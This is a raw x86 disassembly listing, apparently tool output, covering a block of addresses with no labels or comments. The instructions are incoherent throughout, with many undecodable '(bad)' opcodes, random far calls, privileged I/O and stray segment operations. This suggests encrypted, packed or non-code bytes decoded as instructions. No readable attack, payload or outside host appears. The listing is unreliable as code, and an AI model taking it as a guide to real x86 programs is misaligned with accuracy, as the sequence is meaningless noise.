  4118d1:	jmp    0xa7c2e302
  4118d6:	in     eax,dx
  4118d7:	add    BYTE PTR [esp+edi*8],ch
  4118da:	xchg   ax,ax
  4118dc:	frstor [edi]
  4118de:	mov    ebp,0xbd524f40
  4118e3:	imul   edx,DWORD PTR [esi+0x2e],0xffffffa0
  4118e7:	xor    esi,DWORD PTR [esi-0x68]
  4118ea:	sbb    BYTE PTR [edx-0x1d7802be],ah
  4118f0:	rcl    DWORD PTR [ecx],0xb6
  4118f3:	dec    edi
  4118f4:	and    BYTE PTR [esi+0x4de8a4d3],ch
  4118fa:	mov    ebx,0xe4d63d29
  4118ff:	pop    ebp
  411900:	mov    ecx,0x942011cf
  411905:	ret    0xcc2b
  411908:	es add edi,0xffffff8c
  41190c:	ss jecxz 0x41191b
  41190f:	add    DWORD PTR [edx],esp
  411911:	and    eax,0x770231c9
  411916:	fsub   QWORD PTR [esi]
  411918:	and    DWORD PTR [esi-0x61],ebp
  41191b:	popa   
  41191c:	adc    DWORD PTR [eax],ecx
  41191e:	xor    ecx,DWORD PTR [esi]
  411920:	inc    eax
  411921:	or     BYTE PTR [edi],0x44
  411924:	mov    BYTE PTR [ecx-0x5f],dh
  411927:	inc    edi
  411928:	pusha  
  411929:	mov    eax,0xa0a7d02
  41192e:	call   WORD PTR [ebx+esi*8]
  411932:	(bad)  
  411933:	pop    esp
  411934:	xchg   edi,eax
  411935:	cmc    
  411936:	imul   edi,DWORD PTR [edi*4-0x2a2e17d],0xba3d9a15
  411941:	scas   al,BYTE PTR es:[edi]
  411942:	rol    BYTE PTR ds:[edi-0x75],cl
  411946:	jmp    0x41199b
  411948:	dec    esp
  411949:	jg     0x4119a9
  41194b:	jmp    0xfb420cf6
  411950:	inc    ebp
  411951:	xor    cl,ah
  411953:	xchg   edx,eax
  411954:	inc    edi
  411955:	dec    ebx
  411956:	ja     0x411981
  411958:	mov    ah,0xc1
  41195a:	call   0x71fe:0x1a5fc2cd
  411961:	pop    esi
  411962:	stos   BYTE PTR es:[edi],al
  411963:	or     eax,0x1a4bafd5
  411968:	ins    BYTE PTR es:[edi],dx
  411969:	rcr    DWORD PTR [ecx+0x78],1
  41196c:	out    0x9f,al
  41196e:	scas   eax,DWORD PTR es:[edi]
  41196f:	push   0x22
  411971:	ffree  st(7)
  411973:	popf   
  411974:	mov    edx,0x9c1cb04b
  411979:	push   ebx
  41197a:	stc    
  41197b:	pop    ds
  41197c:	(bad)  
  41197d:	icebp  
  41197e:	dec    ebp
  41197f:	icebp  
  411980:	loopne 0x411990
  411982:	aam    0x98
  411984:	sub    cl,dl
  411986:	shr    BYTE PTR [ecx+0x8f0b745],1
  41198c:	push   cs
  41198d:	das    
  41198e:	icebp  
  41198f:	xor    bl,al
  411991:	(bad)  
  411992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411993:	mov    dh,0xeb
  411995:	bound  ebp,QWORD PTR [edi+0x6a]
  411998:	xchg   ebp,eax
  411999:	or     ch,BYTE PTR [eax-0x5724cad6]
  41199f:	add    eax,0xb75596ba
  4119a4:	fsub   st,st(6)
  4119a6:	dec    edx
  4119a7:	test   DWORD PTR [ebp+0x738602b9],esi
  4119ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ae:	xlat   BYTE PTR ds:[ebx]
  4119af:	clc    
  4119b0:	lds    esp,FWORD PTR [eax]
  4119b2:	aad    0x50
  4119b4:	jp     0x4119e9
  4119b6:	xchg   DWORD PTR [ecx+0x1],eax
  4119b9:	push   cs
  4119ba:	lods   al,BYTE PTR ds:[esi]
  4119bb:	mov    gs,WORD PTR [eax]
  4119bd:	ficomp WORD PTR [ebp+0x1d973101]
  4119c3:	iret   
  4119c4:	adc    eax,DWORD PTR [edx]
  4119c6:	sbb    DWORD PTR [esi-0xb],ebx
  4119c9:	mov    al,ds:0xa8cfeb9
  4119ce:	mov    dh,0x61
  4119d0:	popf   
  4119d1:	rcr    DWORD PTR [ebp+0x5c5866f4],0x47
  4119d8:	push   0x1e
  4119da:	mov    cl,0xfe
  4119dc:	bound  edx,QWORD PTR es:[edx+esi*4]
  4119e0:	jg     0x41198a
  4119e2:	or     BYTE PTR [eax],0xed
  4119e5:	jne    0x411a44
  4119e7:	jmp    FWORD PTR [esi]
  4119e9:	shl    ecx,cl
  4119eb:	push   ss
  4119ec:	js     0x411a3b
  4119ee:	sub    ebx,ebx
  4119f0:	mov    edi,0x21b4125e
  4119f5:	and    eax,0x949d79ee
  4119fa:	add    al,0x59
  4119fc:	jge    0x411a3c
  4119fe:	cmp    DWORD PTR [edx+0x40],ebx
  411a01:	jp     0x41198c
  411a03:	sub    cl,0x45
  411a06:	xchg   esp,eax
  411a07:	ret    
  411a08:	jmp    FWORD PTR [ebp+0x2f4c36c4]
  411a0e:	jbe    0x411994
  411a10:	popf   
  411a11:	cmp    al,0x1
  411a13:	jl     0x411a2c
  411a15:	mov    ds:0x53267e24,eax
  411a1a:	fdivr  QWORD PTR [ecx]
  411a1c:	xchg   ecx,eax
  411a1d:	pop    esp
  411a1e:	fiadd  WORD PTR [edx]
  411a20:	call   0xab95:0xdee2fa17
  411a27:	and    cl,BYTE PTR [ecx-0x1ec34f3e]
  411a2d:	fst    QWORD PTR [eax]
  411a2f:	out    dx,eax
  411a30:	in     eax,0x91
  411a32:	inc    esp
  411a33:	fwait
  411a34:	cld    
  411a35:	jb     0x4119e0
  411a37:	add    esi,eax
  411a39:	mov    ah,0x8
  411a3b:	xor    eax,DWORD PTR [ebx+0x48]
  411a3e:	lods   al,BYTE PTR ds:[esi]
  411a3f:	sbb    eax,DWORD PTR [edi+0x75115c6f]
  411a45:	jb     0x411a48
  411a47:	add    al,0xb
  411a49:	and    eax,0xc2c67b61
  411a4e:	les    edx,FWORD PTR [edx+0x6954accc]
  411a54:	cwde   
  411a55:	mov    edx,0xd2855359
  411a5a:	(bad)  
  411a5c:	pop    ebx
  411a5d:	nop
  411a5e:	enter  0x1ef1,0xda
  411a62:	fstp   TBYTE PTR [eax+0x3e3e7d8b]
  411a68:	lods   al,BYTE PTR ds:[esi]
  411a69:	xchg   ecx,eax
  411a6a:	add    dh,al
  411a6c:	pop    ss
  411a6d:	sbb    cl,BYTE PTR ds:0x721840c
  411a73:	push   edx
  411a74:	ds cs inc eax
  411a77:	loopne 0x411a26
  411a79:	fld    DWORD PTR [edx+edx*4-0x1f]
  411a7d:	or     eax,0x481e7077
  411a82:	xchg   ebp,eax
  411a83:	lock in al,0x14
  411a86:	leave  
  411a87:	xchg   ecx,eax
  411a88:	jp     0x411a41
  411a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a8b:	dec    ebx
  411a8c:	sbb    al,0x27
  411a8e:	xchg   ecx,eax
  411a8f:	xchg   ebx,eax
  411a90:	or     bl,BYTE PTR ds:0xc40765e5
  411a96:	jmp    0x411ad7
  411a98:	xchg   ebx,eax
  411a99:	mov    ebx,0xecfab6fc
  411a9e:	add    bl,cl
  411aa0:	stos   DWORD PTR es:[edi],eax
  411aa1:	dec    esi
  411aa2:	mov    al,0x96
  411aa4:	or     eax,0xaf1a3b30
  411aa9:	sbb    BYTE PTR [eax-0x3b39ac69],0xa9
  411ab0:	shr    DWORD PTR [ebx+0x15],0xd8
  411ab4:	clc    
  411ab5:	mov    ebx,0xc36db838
  411aba:	retf   0x8b21
  411abd:	mov    DWORD PTR [eax-0x48ab54e4],edi
  411ac3:	pop    eax
  411ac4:	jno    0x411b41
  411ac6:	sbb    al,0x7c
  411ac8:	std    
  411ac9:	inc    esp
  411aca:	pop    ebp
  411acb:	push   esp
  411acc:	pop    ss
  411acd:	pop    ds
  411ace:	pop    ss
  411acf:	(bad)  
  411ad0:	stc    
  411ad1:	mov    ecx,0xdefaecd2
  411ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad7:	push   esi
  411ad8:	std    
  411ad9:	nop
  411ada:	f2xm1  
  411adc:	add    edx,DWORD PTR [edi]
  411ade:	dec    esi
  411adf:	add    DWORD PTR [edi+0x13cf710a],edx
  411ae5:	sub    al,0x4f
  411ae7:	inc    ebp
  411ae8:	sahf   
  411ae9:	dec    edi
  411aea:	dec    ebp
  411aeb:	loop   0x411b4c
  411aed:	mov    edi,0xe5723158
  411af2:	sub    DWORD PTR [ebx],eax
  411af4:	jae    0x411aa5
  411af6:	int    0x55
  411af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af9:	xchg   esp,eax
  411afa:	nop
  411afb:	fcomp  QWORD PTR [eax-0x65]
  411afe:	or     ebp,ebp
  411b00:	sub    al,0x2e
  411b02:	jno    0x411ad4
  411b04:	imul   esp,DWORD PTR [ebp-0x6265ba8e],0xffffffbc
  411b0b:	cmc    
  411b0c:	xor    ch,BYTE PTR [ecx+0x735337ae]
  411b12:	push   esp
  411b13:	pop    edi
  411b14:	lods   eax,DWORD PTR ds:[esi]
  411b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b16:	or     al,0x2f
  411b18:	repz sahf 
  411b1a:	adc    DWORD PTR [edi+ecx*2+0x4c],esp
  411b1e:	sahf   
  411b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b20:	cmp    esi,esi
  411b22:	ret    
  411b23:	adc    eax,0xfe0c88f7
  411b28:	mov    ch,dh
  411b2a:	js     0x411b1a
  411b2c:	inc    ecx
  411b2d:	adc    BYTE PTR [eax-0x56],bl
  411b30:	jg     0x411b2c
  411b32:	imul   edx,DWORD PTR [ebx+0x16],0xffffffce
  411b36:	adc    eax,0x168f4c81
  411b3b:	push   0xcb46fb8d
  411b40:	sbb    al,0x2e
  411b42:	add    al,0x3c
  411b44:	test   BYTE PTR [edi-0x3d],bl
  411b47:	lds    ebp,FWORD PTR [edi-0x68]
  411b4a:	daa    
  411b4b:	cmp    BYTE PTR gs:[edx-0x64],0x60
  411b50:	rcr    DWORD PTR [ecx+edx*1-0xc9c3b34],cl
  411b57:	add    BYTE PTR [ebp+0x58],al
  411b5a:	jne    0x411bc3
  411b5c:	fs xor eax,0x35c7bff8
  411b62:	scas   al,BYTE PTR es:[edi]
  411b63:	and    BYTE PTR [edi],dh
  411b65:	lds    esp,FWORD PTR [ebx]
  411b67:	shl    BYTE PTR [ebp+eax*2-0x48932fce],0x74
  411b6f:	jae    0x411b20
  411b71:	mov    ecx,ebx
  411b73:	ds daa 
  411b75:	data16 loope 0x411b10
  411b78:	pop    ss
  411b79:	xor    BYTE PTR [esi+0x224341e6],al
  411b7f:	adc    ebp,DWORD PTR [ebp+edx*1-0x5d67d99d]
  411b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b87:	pop    ds
  411b88:	pop    ebp
  411b89:	cmp    al,0x5b
  411b8b:	mov    dh,0xab
  411b8d:	scas   eax,DWORD PTR es:[edi]
  411b8e:	sahf   
  411b8f:	int    0x2f
  411b91:	popf   
  411b92:	sub    al,0x9c
  411b94:	loopne 0x411b3c
  411b96:	fld    TBYTE PTR [ebx+0x869cc3b]
  411b9c:	mov    ebp,0x91eca420
  411ba1:	jecxz  0x411b82
  411ba3:	gs pop edi
  411ba5:	in     eax,0xa7
  411ba7:	dec    ebx
  411ba8:	mov    cl,0xb
  411baa:	outs   dx,BYTE PTR ds:[esi]
  411bab:	bound  ebp,QWORD PTR [edx+0x5]
  411bae:	jnp    0x411b94
  411bb0:	pop    edi
  411bb1:	aad    0x1
  411bb3:	cdq    
  411bb4:	scas   al,BYTE PTR es:[edi]
  411bb5:	popf   
  411bb6:	inc    ebx
  411bb7:	dec    eax
  411bb8:	aas    
  411bb9:	adc    DWORD PTR [ebp+0x71],ebp
  411bbc:	(bad)  
  411bbd:	into   
  411bbe:	adc    bh,dl
  411bc0:	xchg   edx,eax
  411bc1:	je     0x411bc1
  411bc3:	inc    esi
  411bc4:	mov    eax,0x1b80a5e0
  411bc9:	mov    bh,0xaf
  411bcb:	push   es
  411bcc:	cmp    al,0xcd
  411bce:	ror    DWORD PTR [ebx+esi*8-0x6550ba4a],1
  411bd5:	(bad)  
  411bd6:	ja     0x411c36
  411bd8:	rcl    al,0xac
  411bdb:	dec    edi
  411bdc:	jge    0x411ba6
  411bde:	fild   WORD PTR [ecx-0x2960445d]
  411be4:	cmp    edi,edx
  411be6:	out    dx,eax
  411be7:	jae    0x411c31
  411be9:	(bad)
  411bec:	and    BYTE PTR [edi+esi*8],dh
  411bef:	daa    
  411bf0:	add    BYTE PTR [ebp+0x62],0x64
  411bf4:	jmp    0x6af3eb04
  411bf9:	ret    
  411bfa:	test   BYTE PTR [edi+0x5a76d9b4],0x74
  411c01:	ja     0x411b95
  411c03:	push   esi
  411c04:	les    eax,FWORD PTR [eax+0x3d]
  411c07:	jmp    0x411bd9
  411c09:	mov    dl,0x79
  411c0b:	sub    ebp,edx
  411c0d:	test   DWORD PTR [ebp+ebp*4+0x1c677688],eax
  411c14:	iret   
  411c15:	(bad)  
  411c16:	stc    
  411c17:	popf   
  411c18:	and    al,0xa7
  411c1a:	push   ebx
  411c1b:	pop    eax
  411c1c:	fwait
  411c1d:	push   edx
  411c1e:	clc    
  411c1f:	cmp    DWORD PTR [esi],edx
  411c21:	addr16 jne 0x411ca2
  411c24:	retf   0x905a
  411c27:	pusha  
  411c28:	adc    DWORD PTR ds:0xd044d096,ebp
  411c2e:	add    dh,dh
  411c30:	test   DWORD PTR [edx],0x18da8ad4
  411c36:	push   eax
  411c37:	pop    es
  411c38:	push   edi
  411c39:	adc    eax,0xeea228f1
  411c3e:	adc    eax,0xe61b986e
  411c43:	mov    esi,0x3faf2924
  411c48:	hlt    
  411c49:	inc    ebx
  411c4a:	aas    
  411c4b:	lds    esp,FWORD PTR [esi+0x65726922]
  411c51:	ret    0x53d6
  411c54:	adc    DWORD PTR [edx],ecx
  411c56:	mov    DWORD PTR [ebx-0x5f],edi
  411c59:	sbb    DWORD PTR [esi+0x1d5c64bd],esp
  411c5f:	stos   DWORD PTR es:[edi],eax
  411c60:	mov    ds:0x887ea6ef,al
  411c65:	fiadd  DWORD PTR [ecx]
  411c68:	sbb    ebx,ebx
  411c6a:	cli    
  411c6b:	ret    
  411c6c:	mov    eax,ds:0x968136ed
  411c71:	adc    dl,BYTE PTR ds:0xa80bf04b
  411c77:	icebp  
  411c78:	imul   edx,DWORD PTR [esi+0x7f],0x867af5ba
  411c7f:	sub    al,0xb8
  411c81:	jae    0x411ce3
  411c83:	xor    BYTE PTR [edi+ebp*8-0x2],ah
  411c87:	cs aaa 
  411c89:	and    BYTE PTR [edi],dh
  411c8b:	lods   eax,DWORD PTR ds:[esi]
  411c8c:	lods   eax,DWORD PTR ds:[esi]
  411c8d:	test   al,0xa
  411c8f:	xor    dl,bl
  411c91:	test   al,0x2c
  411c93:	push   edx
  411c94:	xlat   BYTE PTR ds:[ebx]
  411c95:	in     al,0xc3
  411c97:	call   0x3bbc:0x4ab4ae74
  411c9e:	xchg   edi,eax
  411c9f:	out    dx,al
  411ca0:	cdq    
  411ca1:	mov    eax,ds:0xdafa7721
  411ca6:	mov    eax,ds:0x2d5345ae
  411cab:	ins    BYTE PTR es:[edi],dx
  411cac:	mov    al,ds:0xe05176eb
  411cb1:	ins    DWORD PTR es:[edi],dx
  411cb2:	xchg   BYTE PTR [ebp+edi*4-0x7e],dh
  411cb6:	pop    esp
  411cb7:	sub    cl,BYTE PTR [esi+ebp*2-0xc]
  411cbb:	sbb    al,0x31
  411cbd:	int    0x58
  411cbf:	(bad)  
  411cc0:	lods   eax,DWORD PTR ds:[esi]
  411cc1:	int    0xa7
  411cc3:	dec    edx
  411cc4:	loopne 0x411c8c
  411cc6:	out    0x34,al
  411cc8:	ror    DWORD PTR [esi-0x3f8c710f],0x21
  411ccf:	mov    DWORD PTR [edx+0xd],ebp
  411cd2:	and    dl,dh
  411cd4:	repnz imul esi,DWORD PTR [eax+0x76],0x8e027de0
  411cdc:	pop    ss
  411cdd:	cmp    edx,edi
  411cdf:	cs int 0xd6
  411ce2:	popf   
  411ce3:	and    bh,dh
  411ce5:	call   0x5244:0x256725cb
  411cec:	into   
  411ced:	lock (bad) [edx+0x6d33d53e]
  411cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cf5:	and    esi,DWORD PTR [edi]
  411cf7:	aas    
  411cf8:	push   ds
  411cf9:	sub    al,0xca
  411cfb:	inc    esi
  411cfc:	push   eax
  411cfd:	xor    BYTE PTR [ebp+0x7c0bfb26],al
  411d03:	pop    eax
  411d04:	pop    esi
  411d05:	xchg   DWORD PTR [esp+edi*1-0xd],ebx
  411d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d0a:	ret    0xe44f
  411d0d:	retf   0x5eb1
  411d10:	push   ecx
  411d11:	push   0x48
  411d13:	mov    ds:0x3fa34f0,al
  411d18:	add    ecx,DWORD PTR [edx]
  411d1a:	push   ebx
  411d1b:	inc    esi
  411d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d1d:	test   DWORD PTR [ecx+0x58],0x11ac38db
  411d24:	fild   QWORD PTR [eax]
  411d26:	(bad)  
  411d27:	pusha  
  411d28:	xor    BYTE PTR ds:0xd53ca12c,0xc
  411d2f:	ins    DWORD PTR es:[edi],dx
  411d30:	inc    esp
  411d31:	mov    al,ds:0x5eccdd4d
  411d36:	fdiv   QWORD PTR [esi-0x22c50ea8]
  411d3c:	push   0x2101e7c4
  411d41:	mul    DWORD PTR [edx+0x22]
  411d44:	in     eax,0xb0
  411d46:	xor    eax,0xa00a2a73
  411d4b:	xchg   edx,eax
  411d4c:	cs adc al,0xe6
  411d4f:	std    
  411d50:	pop    edi
  411d51:	cs push esi
  411d53:	sbb    ecx,DWORD PTR [ebx]
  411d55:	(bad)  
  411d56:	cmp    al,BYTE PTR [eax]
  411d58:	lock mov al,ds:0x24112ac1
  411d5e:	sub    BYTE PTR [esi-0x66],0xb1
  411d62:	mov    DWORD PTR [edx-0x575a0cd4],eax
  411d68:	and    BYTE PTR [ecx-0x1f60be69],al
  411d6e:	push   cs
  411d6f:	xchg   edi,eax
  411d70:	pop    es
  411d71:	add    eax,0xa9195fc3
  411d76:	ss sub al,0x21
  411d79:	(bad)
  411d7c:	loopne 0x411dd4
  411d7e:	test   dh,bl
  411d80:	aam    0x3a
  411d82:	jbe    0x411d4b
  411d84:	imul   ecx,DWORD PTR [esi],0xffffffeb
  411d87:	mov    ch,cl
  411d89:	sub    esp,ebp
  411d8b:	add    al,0x67
  411d8d:	xchg   ecx,eax
  411d8e:	pop    ss
  411d8f:	enter  0xe372,0x94
  411d93:	xor    BYTE PTR [ecx-0x58],0xfe
  411d97:	ficom  WORD PTR [ecx+0x27]
  411d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9b:	scas   eax,DWORD PTR es:[edi]
  411d9c:	popa   
  411d9d:	loopne 0x411d7e
  411d9f:	mov    eax,0x2575610a
  411da4:	push   eax
  411da5:	call   0x5742:0x5c519fe9
  411dac:	mov    ds:0xc596d38d,eax
  411db1:	xchg   edi,eax
  411db2:	adc    ch,BYTE PTR [esi]
  411db4:	mov    dh,BYTE PTR [edx+0x7]
  411db7:	add    al,0xf1
  411db9:	xchg   esp,eax
  411dba:	or     BYTE PTR [edx],dh
  411dbc:	les    edi,FWORD PTR [esi+0x658c1b7d]
  411dc2:	ror    BYTE PTR [ebp-0x2a188c6e],0x95
  411dc9:	push   edx
  411dca:	sbb    eax,0xb9d4a743
  411dcf:	xchg   ecx,eax
  411dd0:	xchg   ebx,eax
  411dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd2:	loope  0x411d6c
  411dd4:	jecxz  0x411e3c
  411dd6:	pop    ebx
  411dd7:	aam    0x4
  411dd9:	sub    edi,eax
  411ddb:	cdq    
  411ddc:	add    eax,0xf21b33f0
  411de1:	fsub   QWORD PTR [esi+0x25]
  411de4:	sbb    eax,ebp
  411de6:	lahf   
  411de7:	add    al,0x25
  411de9:	mov    al,0x44
  411deb:	dec    ebx
  411dec:	int3   
  411ded:	std    
  411dee:	mov    ds:0x52e8bc2,al
  411df3:	cs repnz test eax,0xce82bf8b
  411dfa:	(bad)  
  411dfb:	push   ds
  411dfc:	fistp  QWORD PTR [esi]
  411dfe:	mov    eax,0x3064e303
  411e03:	jg     0x411e62
  411e05:	jl     0x411e2f
  411e07:	dec    esi
  411e08:	xor    eax,0x9fdb52db
  411e0d:	clc    
  411e0e:	sbb    cl,BYTE PTR [esi]
  411e10:	xchg   esp,eax
  411e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e13:	int3   
  411e14:	mov    bh,0xae
  411e16:	and    cl,BYTE PTR [eax]
  411e18:	inc    ebx
  411e19:	jo     0x411e2c
  411e1b:	dec    esi
  411e1c:	adc    al,0xe7
  411e1e:	in     eax,0xd5
  411e20:	mov    edi,0x752105bc
  411e25:	ins    BYTE PTR es:[edi],dx
  411e26:	mov    ebp,0x98084a11
  411e2b:	xchg   DWORD PTR ds:0x3c01d30b,esp
  411e31:	jmp    0x7b3:0xd36e9a61
  411e38:	pusha  
  411e39:	inc    esi
  411e3a:	push   ebx
  411e3b:	lahf   
  411e3c:	loop   0x411dfe
  411e3e:	inc    ebx
  411e3f:	sbb    BYTE PTR [edi-0x61],bh
  411e42:	mov    bh,0x1d
  411e44:	aam    0x5b
  411e46:	push   cs
  411e47:	fadd   QWORD PTR [eax]
  411e49:	daa    
  411e4a:	aad    0x93
  411e4c:	push   cs
  411e4d:	sbb    BYTE PTR [esi],0xec
  411e50:	push   ebp
  411e51:	or     DWORD PTR [ebp+ecx*4+0x39],edx
  411e55:	push   ebx
  411e56:	adc    ecx,esp
  411e58:	and    al,0x4
  411e5a:	popf   
  411e5b:	mov    ecx,0x64e082f5
  411e60:	push   ds
  411e61:	daa    
  411e62:	and    eax,0xd61c5575
  411e67:	bnd jne 0x411e67
  411e6a:	add    ecx,DWORD PTR [esi+0x223af18a]
  411e70:	inc    cl
  411e72:	xor    BYTE PTR [edx+edi*1-0x32],ah
  411e76:	jge    0x411ec0
  411e78:	mov    eax,0x87704f96
  411e7d:	pop    edx
  411e7e:	mov    dl,cl
  411e80:	mov    ds:0xd0d83b0e,al
  411e85:	inc    ebx
  411e86:	sub    edx,esp
  411e88:	pop    ss
  411e89:	mov    WORD PTR [esi],?
  411e8b:	inc    edx
  411e8c:	jno    0x411e77
  411e8e:	scas   al,BYTE PTR es:[edi]
  411e8f:	jl     0x411edc
  411e91:	cld    
  411e92:	das    
  411e93:	daa    
  411e94:	cmp    al,0x7a
  411e96:	(bad)  
  411e98:	mov    edx,0xfcef30cd
  411e9d:	gs push cs
  411e9f:	add    edi,ebp
  411ea1:	inc    ebx
  411ea2:	and    eax,DWORD PTR [edi+0x7d]
  411ea5:	pop    edi
  411ea6:	jecxz  0x411e95
  411ea8:	scas   al,BYTE PTR es:[edi]
  411ea9:	mov    ds:0xd3676c77,eax
  411eae:	repz in al,dx
  411eb0:	pop    edi
  411eb1:	pop    ss
  411eb2:	clc    
  411eb3:	xor    ebx,DWORD PTR ds:0x64ce7e57
  411eb9:	xchg   ebp,eax
  411eba:	mov    fs,WORD PTR [edi-0x7a278c87]
  411ec0:	pop    es
  411ec1:	iret   
  411ec2:	xchg   edi,eax
  411ec3:	sub    dl,ch
  411ec5:	das    
  411ec6:	out    0xd9,al
  411ec8:	sub    DWORD PTR [ecx-0x3b1f02ae],eax
  411ece:	push   ds
  411ecf:	ja     0x411f26
  411ed1:	das    
  411ed2:	sub    ebp,DWORD PTR [ecx]
  411ed4:	cmp    DWORD PTR [ecx],esp
  411ed6:	fild   WORD PTR [esi+0x1d]
  411ed9:	fisub  WORD PTR [ebp+0x757a44ec]
  411edf:	and    DWORD PTR [esi-0x7fefe75d],edx
  411ee5:	pop    ebx
  411ee6:	xchg   esi,eax
  411ee7:	sub    bl,bl
  411ee9:	sbb    eax,0xa1a580e7
  411eee:	out    dx,al
  411eef:	or     al,0x28
  411ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef2:	xchg   DWORD PTR [ecx+0x7bc62a67],edx
  411ef8:	dec    ebp
  411ef9:	and    dl,al
  411efb:	leave  
  411efc:	lds    edx,FWORD PTR [eax-0x7d2838c4]
  411f02:	rcr    edi,cl
  411f04:	jl     0x411f37
  411f06:	js     0x411f4e
  411f08:	ror    BYTE PTR [esi+edi*1],1
  411f0b:	cmp    ch,ah
  411f0d:	out    dx,eax
  411f0e:	push   cs
  411f0f:	inc    edi
  411f10:	or     eax,0x503a137f
  411f15:	or     BYTE PTR ds:0x619bc4fd,bl
  411f1b:	cmp    dh,ah
  411f1d:	sub    eax,0x3df303cf
  411f22:	sar    DWORD PTR [ebx-0x86ec1d0],0xab
  411f29:	scas   al,BYTE PTR es:[edi]
  411f2a:	pop    es
  411f2b:	xlat   BYTE PTR ds:[ebx]
  411f2c:	cwde   
  411f2d:	cmp    edx,DWORD PTR [ebp-0x80]
  411f30:	mov    ch,0x8d
  411f32:	xchg   ebp,eax
  411f33:	clc    
  411f34:	cmp    ch,BYTE PTR [esi-0x51be97c9]
  411f3a:	push   ebx
  411f3b:	retf   
  411f3c:	je     0x411ed3
  411f3e:	neg    ah
  411f40:	out    dx,eax
  411f41:	pusha  
  411f42:	xor    ebx,ebp
  411f44:	push   ecx
  411f45:	and    ah,BYTE PTR [ebp+0x4764389c]
  411f4b:	mov    ah,0xf
  411f4d:	or     ebp,DWORD PTR [ecx]
  411f4f:	push   eax
  411f50:	inc    esi
  411f51:	sbb    edi,DWORD PTR [eax]
  411f53:	add    DWORD PTR [eax],esi
  411f55:	sub    DWORD PTR [ebp+esi*1+0x4e],0xffffffa7
  411f5a:	xor    esp,edx
  411f5c:	popf   
  411f5d:	add    al,0xef
  411f5f:	test   BYTE PTR [ecx+0x13],ch
  411f62:	ins    BYTE PTR es:[edi],dx
  411f63:	sub    bl,BYTE PTR [esi+0x6f]
  411f66:	dec    ebx
  411f67:	adc    eax,0x89bfc93b
  411f6c:	mov    fs,WORD PTR [esi-0x13]
  411f6f:	bswap  edi
  411f71:	add    al,0x7d
  411f73:	repz sub ebp,DWORD PTR [ebp-0x3c362375]
  411f7a:	push   esi
  411f7b:	jg     0x411f29
  411f7d:	rol    DWORD PTR [edi+0x28cd3546],0x35
  411f84:	xchg   ecx,eax
  411f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f86:	hlt    
  411f87:	fsubrp st(7),st
  411f89:	inc    edi
  411f8a:	sbb    BYTE PTR ds:0x2cfc71b1,cl
  411f90:	xor    al,0xc3
  411f92:	stc    
  411f93:	bound  esp,QWORD PTR [edi]
  411f95:	xchg   esi,eax
  411f96:	scas   al,BYTE PTR es:[edi]
  411f97:	(bad)  [edx-0x6c]
  411f9a:	add    al,0xe7
  411f9c:	rcl    DWORD PTR [edi+eiz*8-0x3b00779d],0x37
  411fa4:	out    0x9d,al
  411fa6:	adc    ebp,DWORD PTR [edi-0x16]
  411fa9:	ret    0xe67d
  411fac:	dec    esp
  411fad:	push   es
  411fae:	popa   
  411faf:	xchg   edi,eax
  411fb0:	pop    ebx
  411fb1:	mov    ch,0x62
  411fb3:	sub    bh,BYTE PTR [eax+0x4478110f]
  411fb9:	sbb    BYTE PTR [ecx],bh
  411fbb:	in     eax,0xe7
  411fbd:	dec    edx
  411fbe:	mov    esp,0x935ef3bb
  411fc3:	into   
  411fc4:	adc    eax,0xc6de63b0
  411fc9:	add    esi,DWORD PTR [edx]
  411fcb:	in     al,dx
  411fcc:	popf   
  411fcd:	xchg   esp,eax
  411fce:	icebp  
  411fcf:	add    dh,dh
  411fd1:	xchg   edx,eax
  411fd2:	call   0x34a:0xa482e0f1
  411fd9:	sub    DWORD PTR [ebp+0x286a8daf],0xb7e17de5
  411fe3:	popf   
  411fe4:	adc    al,0x4c
  411fe6:	fwait
  411fe7:	pusha  
  411fe8:	retf   
  411fe9:	jbe    0x412012
  411feb:	add    BYTE PTR [esi],0x79
  411fee:	shl    DWORD PTR [edx],0xda
  411ff1:	in     al,0x7f
  411ff3:	xor    cl,BYTE PTR [edi-0x7d590657]
  411ff9:	jl     0x411fdc
  411ffb:	sub    al,0xff
  411ffd:	fstp   TBYTE PTR [esp+ecx*2-0x35]
  412001:	sbb    cl,BYTE PTR [eax+0x5d7a5697]
  412007:	fnstenv [ecx+0x9a13126]
  41200d:	(bad)
  412011:	lock xor DWORD PTR ds:0x52ba3bf6,ebp
  412018:	xchg   esi,eax
  412019:	mov    ch,0x30
  41201b:	or     ch,BYTE PTR [esi-0x48]
  41201e:	mov    eax,ds:0x3c0f5293
  412023:	stc    
  412024:	sbb    eax,0x73662ac8
  412029:	mov    bh,0x70
  41202b:	cwde   
  41202c:	jo     0x411fd5
  41202e:	xor    BYTE PTR ds:0x3e9f855f,bh
  412034:	cld    
  412035:	and    BYTE PTR [edi],dl
  412037:	sti    
  412038:	dec    edx
  412039:	sub    BYTE PTR [edi],bl
  41203b:	add    DWORD PTR [esi],0x18
  41203e:	cmp    eax,0x56327098
  412043:	int    0x3
  412045:	pusha  
  412046:	jle    0x41207e
  412048:	vhaddpd ymm1,ymm1,YMMWORD PTR [ecx-0x19]
  41204d:	rcl    BYTE PTR [edx],1
  41204f:	or     ecx,DWORD PTR [edx]
  412051:	add    al,0x34
  412053:	ss jecxz 0x41205c
  412056:	(bad)  
  412057:	sbb    DWORD PTR [ecx],ecx
  412059:	jecxz  0x4120cf
  41205b:	adc    BYTE PTR [edx],al
  41205d:	(bad)  
